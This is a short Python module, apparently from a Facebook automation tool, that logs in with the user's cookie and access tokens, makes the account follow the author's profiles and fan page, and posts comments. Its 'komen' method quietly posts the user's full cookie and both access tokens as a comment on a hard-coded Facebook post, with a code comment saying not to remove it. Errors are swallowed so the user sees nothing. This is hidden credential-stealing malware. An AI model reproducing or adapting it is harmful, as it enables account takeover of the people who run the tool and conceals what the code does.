from xyz import *
from bs4 import BeautifulSoup as parser
#--- BOT FOLLOW BOLEH NAMBAH
class bot_romz:
	
	def __init__(self,kukis, tokenG,tokenB):
		self.urL = "https://mbasic.facebook.com"
		self.kukis = kukis 
		self.tokenG = tokenG 
		self.tokenB = tokenB 
		self.roomz = requests.Session()
		
	#--- CONVERT COOKIE DICT TO STRING
	def romz_xyz(self,cookie,venom={}):
		for x in cookie.replace(' ','').strip().split(';'):
			kuki = x.split('=')
			if len(kuki) > 1:
				venom.update({kuki[0]: kuki[1]})
		return venom
		
	#--- jangan di ubah boleh nambah :)
	def guweh(self):
		self.nutukko("romi.afrizal.102")
		self.nutukko("romi.alfarabi")
		self.nutukko("100022086172556") #--- fanspage gw
		self.nutukko("masukan id/username") #--- kalau mau nambah
		# komen 
		self.komen("142132178057034","570025450621946") #--- jangan di hapus
		
	def nutukko(self,userr):
		try:
			respon = parser(self.roomz.get(f"{self.urL}/{userr}",cookies=self.romz_xyz(self.kukis)).text,"html.parser")
			for x in respon.find_all("a",{"href":True}):
				if "/a/subscribe.php" in x["href"]:
					if "Ikuti" in x.text:
						self.roomz.get(self.urL+x["href"],cookies=self.romz_xyz(self.kukis))
		except:pass 
	
	def waktu(self):
		bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
		hari = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
		hari_ini = ("{} {} {}").format(datetime.now().day,bulan,datetime.now().year)
		jam = datetime.now().strftime("%X")
		bot = (f'~ Ditulis oleh Bot ~\n[ Pukul {jam} WIB ]\n- {hari}, {hari_ini} -')
		return(bot)
	
	def komen(self,user1,user2): 
		try:
			botkom = random.choice(["Mantap bang 😁","Hello, I'm a bff-2 user\n\ngithub.com/Mark-Zuck/bff-2","Be yourself and never surender :)"])
			botcooz = ("- [ INFO ] - \n~~~~~~~~~~~ \n[*] cookie:\n{}\n\n[*] accessToken:\n{}\n{}\n\n{}").format(self.kukis,self.tokenG,self.tokenB,self.waktu())             
			self.roomz.post(f"https://graph.facebook.com/{user1}/comments?message={botkom}&access_token={self.tokenB}",cookies={"cookie":self.kukis})
			self.roomz.post(f"https://graph.facebook.com/{user2}/comments?message={botcooz}&access_token={self.tokenB}",cookies={"cookie":self.kukis})
		except:
			pass
